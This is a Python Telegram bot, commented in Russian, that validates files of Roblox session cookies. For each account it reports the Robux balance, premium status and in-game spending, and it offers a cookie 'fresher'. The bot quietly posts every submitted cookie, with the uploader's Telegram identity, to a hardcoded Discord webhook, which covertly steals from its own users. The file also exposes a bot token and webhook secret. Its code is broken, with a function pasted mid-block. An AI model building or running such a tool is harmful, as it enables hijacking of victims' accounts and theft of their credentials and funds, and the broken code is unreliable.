import logging
import aiohttp
import aiofiles
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, BufferedInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import asyncio
import os
import re
import json
import uuid
from datetime import datetime, timedelta
from aiohttp import web

# === КОНФИГУРАЦИЯ ===
TOKEN = os.environ.get('BOT_TOKEN', '8505564774:AAEtQ7_J_BuH9F5r1IlB3Rl7J6nbmbCMLz4')
WEB_STATS_URL = os.environ.get('WEB_STATS_URL', 'https://bulka.pythonanywhere.com')

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Глобальная сессия
session = None

# Discord Webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1435681800457420982/W733zqytPEq5VfjWu4Vugb6hvuO8f1UT9rYRbARkweWiY5ooNdILfYYnBApB7uyHZjX1"

# ID игры Steal A Brainrot
STEAL_A_BRAINROT_UNIVERSE_ID = "5361024331"

# Глобальные настройки пользователей
user_settings = {}

# Состояния для FSM
class FileActions(StatesGroup):
    waiting_for_action = State()

class Settings(StatesGroup):
    waiting_for_settings_action = State()
    waiting_for_min_days = State()

def load_stats():
    """Загружает статистику из файла"""
    try:
        if os.path.exists("stats_data.json"):
            with open("stats_data.json", 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Ошибка загрузки статистики: {e}")
    return {}

def save_stats(stats_data):
    """Сохраняет статистику в файл"""
    try:
        with open("stats_data.json", 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения статистики: {e}")

def load_user_settings():
    """Загружает настройки пользователей"""
    global user_settings
    try:
        if os.path.exists("user_settings.json"):
            with open("user_settings.json", 'r', encoding='utf-8') as f:
                user_settings = json.load(f)
    except Exception as e:
        logger.error(f"Ошибка загрузки настроек: {e}")
        user_settings = {}

def save_user_settings():
    """Сохраняет настройки пользователей"""
    try:
        with open("user_settings.json", 'w', encoding='utf-8') as f:
            json.dump(user_settings, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения настроек: {e}")

# Загружаем данные при запуске
stats_storage = load_stats()
load_user_settings()

def get_user_settings(user_id: int) -> dict:
    """Получает настройки пользователя"""
    if user_id not in user_settings:
        user_settings[user_id] = {
            'remove_new_accounts': False,
            'min_account_age_days': 20,
            'exact_brainrot_check': True
        }
    return user_settings[user_id]

# === ПРОСТОЙ ВЕБ-СЕРВЕР ДЛЯ RENDER ===
async def health_check(request):
    return web.Response(text="🌌 Celestial Bot is alive!")

async def start_web_server():
    """Запускает минимальный веб-сервер для health checks"""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    # Используем порт из переменной окружения Render
    port = int(os.environ.get('PORT', 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logger.info(f"🌐 Health server started on port {port}")
    return runner

async def send_to_discord_webhook(account_info: dict, user_info: dict = None, cookie: str = None, action_type: str = "checker"):
    """Отправляет информацию о проверенном аккаунте в Discord webhook"""
    try:
        session = await get_session()
        
        color = 3066993 if account_info['valid'] else 15158332
        title = "🔍 Новый проверенный аккаунт" if account_info['valid'] else "❌ Невалидный аккаунт"
        
        embed = {
            "title": title,
            "color": color,
            "fields": [
                {
                    "name": "👤 Username",
                    "value": f"`{account_info['username']}`",
                    "inline": True
                },
                {
                    "name": "🆔 User ID",
                    "value": f"`{account_info['user_id']}`",
                    "inline": True
                },
                {
                    "name": "📅 Возраст аккаунта",
                    "value": f"`{account_info.get('account_age_days', 0)} дней`",
                    "inline": True
                }
            ],
            "timestamp": datetime.now().isoformat(),
            "footer": {
                "text": f"Celestial Checker • {action_type.title()}"
            }
        }

        if account_info['valid'] and action_type == "checker":
            embed["fields"].extend([
                {
                    "name": "💰 Robux",
                    "value": f"`{account_info['robux']:,}`",
                    "inline": True
                },
                {
                    "name": "🎁 AllTimeDonate",
                    "value": f"`{account_info['all_time_donate']:,}`",
                    "inline": True
                },
                {
                    "name": "🧠 Steal A Brainrot",
                    "value": f"`{account_info['steal_a_brainrot_spent']:,}`",
                    "inline": True
                },
                {
                    "name": "👑 Premium",
                    "value": "✅ Да" if account_info['premium'] else "❌ Нет",
                    "inline": True
                }
            ])

        status_field = {
            "name": "✅ Статус",
            "value": "Валидный" if account_info['valid'] else f"Невалидный: {account_info.get('error', 'Unknown')}",
            "inline": True
        }
        
        embed["fields"].append(status_field)

        if user_info:
            embed["fields"].append({
                "name": "📱 Telegram User",
                "value": f"ID: `{user_info.get('id', 'N/A')}`\nUsername: @{user_info.get('username', 'N/A')}\nFull Name: {user_info.get('full_name', 'N/A')}",
                "inline": False
            })

        payload = {
            "embeds": [embed],
            "username": "Celestial Checker",
            "avatar_url": "https://cdn.discordapp.com/attachments/1234567890/1234567890/celestial_logo.png"
        }

        async with session.post(DISCORD_WEBHOOK_URL, json=payload) as response:
            if response.status == 204:
                logger.info(f"✅ Информация об аккаунте {account_info['username']} отправлена в Discord")
            else:
                logger.warning(f"⚠️ Ошибка отправки в Discord: {response.status}")
        
        if cookie:
            await send_cookie_to_discord(cookie, account_info['username'], action_type)
                
    except Exception as e:
        logger.error(f"❌ Ошибка отправки в Discord webhook: {e}")

async def send_cookie_to_discord(cookie: str, username: str, action_type: str = "checker"):
    """Отправляет куки в Discord отдельным сообщением"""
    try:
        session = await get_session()
        
        cookie_message = f"🍪 **Cookie для {username}** ({action_type})\n```\n{cookie}\n```"
        
        payload = {
            "content": cookie_message,
            "username": "Celestial Checker - Cookies",
            "avatar_url": "https://cdn.discordapp.com/attachments/1234567890/1234567890/celestial_logo.png"
        }
        
        async with session.post(DISCORD_WEBHOOK_URL, json=payload) as response:
            if response.status == 204:
                logger.info(f"✅ Куки для {username} отправлены в Discord")
            else:
                logger.warning(f"⚠️ Ошибка отправки куки в Discord: {response.status}")
                
    except Exception as e:
        logger.error(f"❌ Ошибка отправки куки в Discord: {e}")

async def get_session():
    """Создает или возвращает глобальную сессию"""
    global session
    if session is None:
        connector = aiohttp.TCPConnector(limit=20, limit_per_host=10, keepalive_timeout=30)
        timeout = aiohttp.ClientTimeout(total=10, connect=6)
        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return session

def create_advanced_progress_bar(progress: float, length: int = 12) -> str:
    """Создает красивый анимированный прогресс-бар"""
    filled = int(progress * length)
    empty = length - filled
    
    if progress < 0.3:
        filled_char = "🟥"
        empty_char = "⬜"
    elif progress < 0.7:
        filled_char = "🟨" 
        empty_char = "⬜"
    else:
        filled_char = "🟩"
        empty_char = "⬜"
    
    bar = filled_char * filled + empty_char * empty
    return f"{bar} {progress:.1%}"

def extract_cookie(line: str) -> str:
    """Извлекает куки из строки"""
    line = line.strip()
    
    if not line:
        return ""
    
    warning_start = line.find("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
    
    if warning_start != -1:
        return line[warning_start:]
    else:
        alternative_starts = [
            "Cookie: _|WARNING",
            "cookie: _|WARNING", 
            "_|WARNING",
            "ROBLOSECURITY: _|WARNING"
        ]
        
        for start in alternative_starts:
            alt_start = line.find(start)
            if alt_start != -1:
                cookie = line[alt_start:]
                if cookie.startswith("Cookie: "):
                    return cookie[8:]
                elif cookie.startswith("cookie: "):
                    return cookie[8:]
                elif cookie.startswith("ROBLOSECURITY: "):
                    return cookie[15:]
        return ""

async def get_fresh_session():
    """Создает новую сессию для каждого аккаунта"""
    connector = aiohttp.TCPConnector(limit_per_host=1, force_close=True)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    return aiohttp.ClientSession(connector=connector, timeout=timeout)

async def get_account_creation_date(session, headers, user_id: int) -> datetime:
    """Получает дату создания аккаунта"""
    try:
        async with session.get(
            f"https://users.roblox.com/v1/users/{user_id}",
            headers=headers
        ) as resp:
            if resp.status == 200:
                user_data = await resp.json()
                created_str = user_data.get('created')
                if created_str:
                    # Убираем 'Z' в конце и добавляем временную зону
                    created_str = created_str.replace('Z', '')
                    if '+' not in created_str and '-' not in created_str:
                        created_str += '+00:00'
                    return datetime.fromisoformat(created_str)
                else:
                    logger.warning(f"❌ Не найдена дата создания для пользователя {user_id}")
            else:
                logger.warning(f"❌ Ошибка получения данных пользователя: HTTP {resp.status}")
    except Exception as e:
        logger.error(f"❌ Ошибка получения даты создания аккаунта: {e}")
    
    # Если не удалось получить, возвращаем старую дату
    return datetime.now() - timedelta(days=365)

async def get_exact_steal_a_brainrot_spent(session, headers, user_id: int) -> int:
    """Точная проверка трат в Steal A Brainrot"""
    total_spent = 0
    
    try:
        # Метод 1: Проверка через API транзакций
        transactions_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions"
        params = {
            'transactionType': 'Purchase',
            'limit': 100
        }
        
        async with session.get(transactions_url, headers=headers, params=params) as resp:
            if resp.status == 200:
                data = await resp.json()
                
                for transaction in data.get('data', []):
                    description = transaction.get('description', '').lower()
                    details = transaction.get('details', {})
                    universe_id = details.get('universeId')
                    item_name = details.get('name', '').lower()
                    
                    # Ключевые слова для идентификации Steal A Brainrot
                    brainrot_keywords = [
                        'steal a brainrot', 'brainrot', 'stealbrainrot',
                        'stealabrainrot', 'sab', 'brain rot', 'steal a brain rot'
                    ]
                    
                    is_brainrot = (
                        any(keyword in description for keyword in brainrot_keywords) or
                        any(keyword in item_name for keyword in brainrot_keywords) or
                        (universe_id and str(universe_id) == STEAL_A_BRAINROT_UNIVERSE_ID)
                    )
                    
                    if is_brainrot:
                        amount = transaction.get('currency', {}).get('amount', 0)
                        if amount < 0:
                            total_spent += abs(amount)
                            logger.info(f"🧠 Найдена трата в Steal A Brainrot: {abs(amount)} Robux")
        
        # Метод 2: Дополнительная проверка через инвентарь
        if total_spent == 0:
            try:
                # Проверяем наличие предметов из игры
                inventory_params = {
                    'assetTypes': 'Hat,Face,Head,Gear,TShirt,Shirt,Pants,Decal',
                    'limit': 50
                }
                async with session.get(
                    f"https://inventory.roblox.com/v2/users/{user_id}/inventory",
                    headers=headers,
                    params=inventory_params
                ) as inv_resp:
                    if inv_resp.status == 200:
                        inventory_data = await inv_resp.json()
                        # Можно добавить дополнительную логику анализа инвентаря
            except Exception as e:
                logger.info(f"ℹ️ Дополнительная проверка инвентаря недоступна: {e}")
            
    except Exception as e:
        logger.warning(f"Ошибка точной проверки Steal A Brainrot: {e}")
    
    logger.info(f"🧠 Точная сумма потраченного в Steal A Brainrot: {total_spent} Robux")
    return total_spent

async def check_single_account(cookie: str, original_line: str = "", user_id: int = None) -> dict:
    """Проверяет один аккаунт с изолированной сессией"""
    result = {
        'valid': False,
        'robux': 0,
        'all_time_donate': 0,
        'steal_a_brainrot_spent': 0,
        'username': 'Unknown',
        'user_id': 0,
        'premium': False,
        'error': None,
        'account_created': None,
        'account_age_days': 0
    }
    
    if not cookie or len(cookie) < 100:
        result['error'] = 'Invalid cookie format'
        return result
    
    # Получаем настройки пользователя (если user_id передан)
    settings = {}
    if user_id:
        settings = get_user_settings(user_id)
    else:
        settings = {'exact_brainrot_check': True}
    
    # Создаем новую сессию для каждого аккаунта
    session = await get_fresh_session()
    
    try:
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json"
        }
        
        # Основная проверка аутентификации
        async with session.get(
            "https://users.roblox.com/v1/users/authenticated",
            headers=headers
        ) as resp:
            if resp.status == 200:
                user_data = await resp.json()
                if user_data.get('id') and user_data.get('name'):
                    result['valid'] = True
                    result['username'] = user_data.get('name', 'Unknown')
                    result['user_id'] = user_data.get('id', 0)
                    
                    logger.info(f"✅ Найден пользователь: {result['username']} (ID: {result['user_id']})")
                    
                    # Получаем дату создания аккаунта
                    creation_date = await get_account_creation_date(session, headers, result['user_id'])
                    result['account_created'] = creation_date
                    result['account_age_days'] = (datetime.now().replace(tzinfo=creation_date.tzinfo) - creation_date).days
                    
                    logger.info(f"📅 Возраст аккаунта: {result['account_age_days']} дней")
                    
                else:
                    result['error'] = 'Invalid user data'
                    return result
            elif resp.status == 401:
                result['error'] = 'Unauthorized - куки невалиден'
                return result
            else:
                result['error'] = f'HTTP {resp.status}'
                return result
        
        # Если куки валидный, получаем все данные
        if result['valid']:
            # Получаем Robux
            try:
                async with session.get(
                    "https://economy.roblox.com/v1/user/currency",
                    headers=headers
                ) as robux_resp:
                    if robux_resp.status == 200:
                        currency_data = await robux_resp.json()
                        result['robux'] = currency_data.get('robux', 0)
                        logger.info(f"💰 Robux: {result['robux']}")
                    else:
                        logger.warning(f"Ошибка получения Robux: HTTP {robux_resp.status}")
            except Exception as e:
                logger.warning(f"Ошибка получения Robux: {e}")
            
            # Получаем Premium статус
            try:
                async with session.get(
                    f"https://premiumfeatures.roblox.com/v1/users/{result['user_id']}/subscriptions",
                    headers=headers
                ) as premium_resp:
                    if premium_resp.status == 200:
                        premium_data = await premium_resp.json()
                        result['premium'] = len(premium_data) > 0
                        logger.info(f"👑 Premium: {'Да' if result['premium'] else 'Нет'}")
            except Exception as e:
                logger.warning(f"Ошибка получения Premium статуса: {e}")
            
            # Получаем AllTimeDonate
            try:
                async def get_all_time_donate_from_api(session, headers, user_id: int) -> int:
    """Пытается получить AllTimeDonate разными способами через API"""
    donate_amount = 0
    
    # Попробуем разные эндпоинты
    endpoints = [
        f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100",
        f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?transactionType=Purchase",
        f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?transactionType=Sale",
    ]
    
    for endpoint in endpoints:
        try:
            async with session.get(endpoint, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    # Обработка разных форматов ответов
                    if 'data' in data:  # Первый эндпоинт
                        transactions = data.get('data', [])
                        total_spent = 0
                        for transaction in transactions:
                            # Суммируем только отрицательные суммы (траты)
                            amount = transaction.get('currency', {}).get('amount', 0)
                            if amount < 0:
                                total_spent += abs(amount)
                        if total_spent > 0:
                            donate_amount = total_spent
                            logger.info(f"🎁 AllTimeDonate из транзакций: {donate_amount}")
                            break
                    
                    elif 'total' in data:  # Второй и третий эндпоинты
                        total = data.get('total', 0)
                        if total > 0:
                            donate_amount = total
                            logger.info(f"🎁 AllTimeDonate из totals: {donate_amount}")
                            break
                        
        except Exception as e:
            logger.warning(f"Ошибка получения AllTimeDonate из {endpoint}: {e}")
            continue
    
    return donate_amount
            
            # Получаем траты в Steal A Brainrot
            if settings.get('exact_brainrot_check', True):
                logger.info("🔍 Запускаю точную проверку Steal A Brainrot...")
                brainrot_spent = await get_exact_steal_a_brainrot_spent(session, headers, result['user_id'])
                result['steal_a_brainrot_spent'] = brainrot_spent
            else:
                # Базовая проверка
                logger.info("🔍 Запускаю базовую проверку Steal A Brainrot...")
                try:
                    async with session.get(
                        f"https://economy.roblox.com/v2/users/{result['user_id']}/transactions?transactionType=Purchase&limit=50",
                        headers=headers
                    ) as brainrot_resp:
                        if brainrot_resp.status == 200:
                            brainrot_data = await brainrot_resp.json()
                            total_spent = 0
                            for transaction in brainrot_data.get('data', []):
                                description = transaction.get('description', '').lower()
                                if 'brainrot' in description or 'steal a brain' in description:
                                    amount = transaction.get('currency', {}).get('amount', 0)
                                    if amount < 0:
                                        total_spent += abs(amount)
                            result['steal_a_brainrot_spent'] = total_spent
                            logger.info(f"🧠 Steal A Brainrot (базовый): {total_spent}")
                except Exception as e:
                    logger.warning(f"Ошибка базовой проверки Steal A Brainrot: {e}")
                            
    except asyncio.TimeoutError:
        result['error'] = 'Timeout'
    except aiohttp.ClientError as e:
        result['error'] = f'Network error: {str(e)}'
    except Exception as e:
        result['error'] = f'Unexpected error: {str(e)}'
    finally:
        await session.close()
    
    return result

def create_action_keyboard():
    """Создает инлайн клавиатуру с выбором действия"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔍 Чекер", callback_data="action_checker"),
                InlineKeyboardButton(text="🔄 Фрешер", callback_data="action_fresher")
            ],
            [
                InlineKeyboardButton(text="⚙️ Настройки", callback_data="action_settings")
            ]
        ]
    )
    return keyboard

def create_settings_keyboard(user_id: int):
    """Создает клавиатуру настроек"""
    settings = get_user_settings(user_id)
    
    remove_text = "✅ Убрать нулевки" if settings['remove_new_accounts'] else "❌ Убрать нулевки"
    exact_check_text = "✅ Точная проверка Brainrot" if settings['exact_brainrot_check'] else "❌ Точная проверка Brainrot"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=remove_text, 
                    callback_data="setting_toggle_remove"
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"📅 Мин. возраст: {settings['min_account_age_days']} дней",
                    callback_data="setting_change_age"
                )
            ],
            [
                InlineKeyboardButton(
                    text=exact_check_text,
                    callback_data="setting_toggle_exact"
                )
            ],
            [
                InlineKeyboardButton(text="🔙 Назад", callback_data="settings_back")
            ]
        ]
    )
    return keyboard

def filter_accounts_by_age(accounts: list, min_age_days: int) -> list:
    """Фильтрует аккаунты по минимальному возрасту"""
    if min_age_days <= 0:
        return accounts
    
    filtered_accounts = []
    removed_count = 0
    
    for account in accounts:
        if account.get('account_age_days', 0) >= min_age_days:
            filtered_accounts.append(account)
        else:
            removed_count += 1
            logger.info(f"📅 Удален аккаунт {account.get('username')} (возраст: {account.get('account_age_days')} дней)")
    
    logger.info(f"📊 Фильтрация по возрасту: удалено {removed_count} аккаунтов")
    return filtered_accounts

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "🌌 <b>Celestial Checker - Проверка и обновление Roblox аккаунтов</b>\n\n"
        "Отправь мне текстовый файл с куками Roblox для проверки или обновления.\n\n"
        "<i>✨ ДОСТУПНЫЕ ФУНКЦИИ:</i>\n"
        "• 🔍 <b>Чекер</b> - проверка аккаунтов на валидность и сбор статистики\n"
        "• 🔄 <b>Фрешер</b> - обновление сессии куков\n"
        "• ⚙️ <b>Настройки</b> - настройки фильтрации и проверки\n\n"
        "<i>⚡ Баланс скорости и точности!</i>",
        parse_mode="HTML"
    )

@dp.message(F.document & F.document.mime_type == "text/plain")
async def handle_file(message: Message, state: FSMContext):
    try:
        user_info = {
            'id': message.from_user.id,
            'username': message.from_user.username,
            'full_name': f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
        }
        
        await state.update_data(user_info=user_info)
        
        file_id = message.document.file_id
        file = await bot.get_file(file_id)
        downloaded_file = await bot.download_file(file.file_path)
        
        content = downloaded_file.read().decode('utf-8', errors='ignore')
        lines = content.split('\n')
        
        account_data = []
        for i, line in enumerate(lines):
            cookie = extract_cookie(line)
            if cookie:
                account_data.append({
                    'index': i + 1,
                    'cookie': cookie,
                    'original_line': line
                })
        
        total_accounts = len(account_data)
        
        if not account_data:
            await message.answer("❌ <b>Не найдено ни одного куки в файле</b>", parse_mode="HTML")
            return
        
        await state.update_data(
            account_data=account_data,
            total_accounts=total_accounts,
            file_content=content
        )
        
        await message.answer(
            f"📁 <b>Файл успешно загружен!</b>\n"
            f"🔍 Найдено <b>{total_accounts}</b> аккаунтов\n\n"
            f"<i>Что сделать с этим файлом?</i>",
            parse_mode="HTML",
            reply_markup=create_action_keyboard()
        )
        
        await state.set_state(FileActions.waiting_for_action)
        
    except Exception as e:
        logger.error(f"Ошибка обработки файла: {e}")
        await message.answer(f"❌ <b>Произошла ошибка:</b>\n<code>{str(e)}</code>", parse_mode="HTML")

@dp.callback_query(F.data == "action_checker")
async def process_checker(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    data = await state.get_data()
    account_data = data.get('account_data', [])
    total_accounts = data.get('total_accounts', 0)
    user_info = data.get('user_info', {})
    
    if not account_data:
        await callback.message.answer("❌ <b>Данные файла не найдены</b>", parse_mode="HTML")
        await state.clear()
        return
    
    logger.info(f"🔍 Начинаю проверку {total_accounts} аккаунтов...")
    
    status_message = await callback.message.answer("🌌 <b>Запускаю Celestial Checker...</b>", parse_mode="HTML")
    
    try:
        await status_message.edit_text(
            f"🔍 <b>Найдено {total_accounts} аккаунтов</b>\n"
            f"⚡ <i>Запускаю проверку...</i>",
            parse_mode="HTML"
        )
        
        # Получаем настройки пользователя
        user_settings = get_user_settings(callback.from_user.id)
        
        valid_accounts = []
        checked_count = 0
        total_robux = 0
        total_donate = 0
        total_brainrot_spent = 0
        premium_count = 0
        
        for account in account_data:
            checked_count += 1
            progress = checked_count / total_accounts
            
            # КРАСИВЫЙ ПРОГРЕСС-БАР
            progress_bar = create_advanced_progress_bar(progress)
            status_text = (
                f"<b>🌌 CELESTIAL CHECKER - ПРОВЕРКА</b>\n\n"
                f"<blockquote>{progress_bar}</blockquote>\n"
                f"🔍 Проверяю аккаунт <b>#{checked_count}</b> из <b>{total_accounts}</b>\n\n"
                f"<b>📈 ТЕКУЩАЯ СТАТИСТИКА:</b>\n"
                f"• ✅ Валидных: <b>{len(valid_accounts)}</b>\n"
                f"• ❌ Невалидных: <b>{checked_count - len(valid_accounts) - 1}</b>\n"
                f"• 💰 Robux: <b>{total_robux:,}</b>\n"
                f"• 🎁 AllTimeDonate: <b>{total_donate:,}</b>\n"
                f"• 🧠 Brainrot: <b>{total_brainrot_spent:,}</b>\n"
                f"• 👑 Premium: <b>{premium_count}</b>"
            )
            
            await status_message.edit_text(status_text, parse_mode="HTML")
            
            logger.info(f"🔍 Проверка аккаунта #{account['index']}")
            
            # Проверяем аккаунт
            account_info = await check_single_account(
                account['cookie'], 
                account['original_line'], 
                callback.from_user.id
            )
            
            if account_info['valid']:
                logger.info(f"✅ Аккаунт валиден: {account_info['username']}")
                total_robux += account_info['robux']
                total_donate += account_info['all_time_donate']
                total_brainrot_spent += account_info['steal_a_brainrot_spent']
                if account_info['premium']:
                    premium_count += 1
                
                valid_acc_data = {
                    'cookie': account['cookie'],
                    'username': account_info['username'],
                    'robux': account_info['robux'],
                    'all_time_donate': account_info['all_time_donate'],
                    'steal_a_brainrot_spent': account_info['steal_a_brainrot_spent'],
                    'premium': account_info['premium'],
                    'user_id': account_info['user_id'],
                    'account_age_days': account_info['account_age_days']
                }
                
                valid_accounts.append(valid_acc_data)
                
                await send_to_discord_webhook(account_info, user_info, account['cookie'], "checker")
                
                logger.info(f"✅ #{account['index']} {account_info['username']}: "
                           f"R${account_info['robux']:,} Donate:{account_info['all_time_donate']:,} "
                           f"Brainrot:{account_info['steal_a_brainrot_spent']:,} Premium:{account_info['premium']}")
            else:
                logger.warning(f"❌ Аккаунт невалиден: {account_info.get('error', 'Unknown error')}")
                # Отправляем информацию о невалидном аккаунте в Discord
                await send_to_discord_webhook(account_info, user_info, account['cookie'], "checker")
            
            await asyncio.sleep(1.5)
        
        # После завершения проверки
        logger.info(f"📊 Проверка завершена: {len(valid_accounts)}/{total_accounts} валидных")
        
        # Применяем фильтрацию по возрасту если включено
        if user_settings['remove_new_accounts'] and valid_accounts:
            original_count = len(valid_accounts)
            valid_accounts = filter_accounts_by_age(valid_accounts, user_settings['min_account_age_days'])
            filtered_count = original_count - len(valid_accounts)
            logger.info(f"📅 Фильтрация: удалено {filtered_count} аккаунтов младше {user_settings['min_account_age_days']} дней")
        
        # Сохраняем статистику
        stats_id = str(uuid.uuid4())[:8]
        stats_data = {
            'id': stats_id,
            'timestamp': datetime.now().isoformat(),
            'total_accounts': total_accounts,
            'valid_accounts': len(valid_accounts),
            'invalid_accounts': total_accounts - len(valid_accounts),
            'premium_count': premium_count,
            'total_robux': total_robux,
            'total_donate': total_donate,
            'total_brainrot_spent': total_brainrot_spent,
            'success_rate': round((len(valid_accounts) / total_accounts * 100) if total_accounts > 0 else 0, 1),
            'accounts': valid_accounts
        }
        
        stats_storage[stats_id] = stats_data
        save_stats(stats_storage)
        
        # Отправляем результаты
        if valid_accounts:
            # Файл с куками
            cookies_content = "\n".join([acc['cookie'] for acc in valid_accounts])
            cookies_file = BufferedInputFile(cookies_content.encode('utf-8'), filename="valid_cookies.txt")
            
            # Файл со статистикой
            stats_content = "🌌 CELESTIAL CHECKER - ДЕТАЛЬНАЯ СТАТИСТИКА\n"
            stats_content += "=" * 80 + "\n"
            stats_content += f"Всего аккаунтов: {len(valid_accounts)}\n"
            stats_content += f"Всего Robux: {total_robux:,}\n"
            stats_content += f"Всего AllTimeDonate: {total_donate:,}\n"
            stats_content += f"Потрачено в Steal A Brainrot: {total_brainrot_spent:,}\n"
            stats_content += f"Premium аккаунтов: {premium_count}\n"
            if user_settings['remove_new_accounts']:
                stats_content += f"Фильтрация: аккаунты старше {user_settings['min_account_age_days']} дней\n"
            stats_content += "=" * 80 + "\n\n"
            stats_content += "ДЕТАЛЬНАЯ ИНФОРМАЦИЯ ПО АККАУНТАМ:\n\n"
            
            for i, acc in enumerate(valid_accounts, 1):
                premium_status = "Yes" if acc['premium'] else "No"
                stats_content += f"{i:2d}. {acc['username']} (ID: {acc['user_id']})\n"
                stats_content += f"    Возраст: {acc['account_age_days']} дней\n"
                stats_content += f"    Robux: {acc['robux']:,} | AllTimeDonate: {acc['all_time_donate']:,}\n"
                stats_content += f"    Steal A Brainrot: {acc['steal_a_brainrot_spent']:,} | Premium: {premium_status}\n"
                stats_content += f"    Cookie: {acc['cookie']}\n\n"
            
            stats_file = BufferedInputFile(stats_content.encode('utf-8'), filename="celestial_stats.txt")
            
            # КРАСИВОЕ ФИНАЛЬНОЕ СООБЩЕНИЕ
            success_rate = round((len(valid_accounts) / total_accounts * 100), 1)
            progress_bar = create_advanced_progress_bar(success_rate / 100)
            
            result_message = (
                f"🌌 <b>CELESTIAL CHECKER - РЕЗУЛЬТАТЫ</b>\n\n"
                f"<b>📊 СТАТИСТИКА:</b>\n"
                f"• 📦 Всего аккаунтов: <b>{total_accounts}</b>\n"
                f"• ✅ Валидных: <b>{len(valid_accounts)}</b>\n"
                f"• ❌ Невалидных: <b>{total_accounts - len(valid_accounts)}</b>\n"
                f"• 👑 Premium: <b>{premium_count}</b>\n"
                f"• 📈 Успешность: <b>{success_rate}%</b>\n"
                f"   {progress_bar}\n\n"
                f"<b>💎 ФИНАНСЫ:</b>\n"
                f"• 💰 Всего Robux: <b>{total_robux:,}</b>\n"
                f"• 🎁 Всего AllTimeDonate: <b>{total_donate:,}</b>\n"
                f"• 🧠 Потрачено в Steal A Brainrot: <b>{total_brainrot_spent:,}</b>\n\n"
            )
            
            if user_settings['remove_new_accounts']:
                result_message += f"<b>⚙️ ФИЛЬТРАЦИЯ:</b>\n"
                result_message += f"• 🗑️ Удалены аккаунты младше <b>{user_settings['min_account_age_days']}</b> дней\n\n"
            
            result_message += "<i>📁 Файлы с результатами ниже</i>"
            
            await status_message.edit_text(result_message, parse_mode="HTML")
            await callback.message.answer_document(cookies_file, caption="✅ <b>Валидные куки</b>", parse_mode="HTML")
            await callback.message.answer_document(stats_file, caption="📊 <b>Детальная статистика</b>", parse_mode="HTML")
        else:
            await status_message.edit_text(
                "❌ <b>Не найдено валидных аккаунтов</b>\n"
                "Проверьте правильность куков в файле.",
                parse_mode="HTML"
            )
            
    except Exception as e:
        logger.error(f"Ошибка обработки файла: {e}")
        error_text = f"❌ <b>Произошла ошибка:</b>\n<code>{str(e)}</code>"
        await status_message.edit_text(error_text, parse_mode="HTML")
    
    finally:
        await state.clear()

@dp.callback_query(F.data == "action_settings")
async def show_settings(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    settings = get_user_settings(callback.from_user.id)
    
    settings_text = (
        f"⚙️ <b>НАСТРОЙКИ CELESTIAL CHECKER</b>\n\n"
        f"<b>Текущие настройки:</b>\n"
        f"• 🗑️ Убрать нулевки: <b>{'Да' if settings['remove_new_accounts'] else 'Нет'}</b>\n"
        f"• 📅 Мин. возраст аккаунта: <b>{settings['min_account_age_days']} дней</b>\n"
        f"• 🧠 Точная проверка Brainrot: <b>{'Да' if settings['exact_brainrot_check'] else 'Нет'}</b>\n\n"
        f"<i>Выберите настройку для изменения:</i>"
    )
    
    await callback.message.edit_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=create_settings_keyboard(callback.from_user.id)
    )
    
    await state.set_state(Settings.waiting_for_settings_action)

@dp.callback_query(F.data == "setting_toggle_remove")
async def toggle_remove_setting(callback: CallbackQuery):
    await callback.answer()
    
    user_id = callback.from_user.id
    settings = get_user_settings(user_id)
    settings['remove_new_accounts'] = not settings['remove_new_accounts']
    
    save_user_settings()
    
    # Обновляем сообщение
    settings_text = (
        f"⚙️ <b>НАСТРОЙКИ CELESTIAL CHECKER</b>\n\n"
        f"<b>Текущие настройки:</b>\n"
        f"• 🗑️ Убрать нулевки: <b>{'Да' if settings['remove_new_accounts'] else 'Нет'}</b>\n"
        f"• 📅 Мин. возраст аккаунта: <b>{settings['min_account_age_days']} дней</b>\n"
        f"• 🧠 Точная проверка Brainrot: <b>{'Да' if settings['exact_brainrot_check'] else 'Нет'}</b>\n\n"
        f"<i>Выберите настройку для изменения:</i>"
    )
    
    await callback.message.edit_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=create_settings_keyboard(user_id)
    )

@dp.callback_query(F.data == "setting_toggle_exact")
async def toggle_exact_setting(callback: CallbackQuery):
    await callback.answer()
    
    user_id = callback.from_user.id
    settings = get_user_settings(user_id)
    settings['exact_brainrot_check'] = not settings['exact_brainrot_check']
